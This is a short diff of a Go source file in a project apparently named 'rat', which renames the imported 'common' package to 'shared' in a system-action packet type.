@@ -1,16 +1,16 @@
 package main
 
 import (
-	"rat/common"
-	"rat/common/system"
+	"rat/shared"
+	"rat/shared/system"
 )
 
 type SysPacket struct {
 	Action system.Action `network:"send"`
 }
 
-func (packet SysPacket) Header() common.PacketHeader {
-	return common.SysHeader
+func (packet SysPacket) Header() shared.PacketHeader {
+	return shared.SysHeader
 }
 
 func (packet SysPacket) Init(c *Client) {
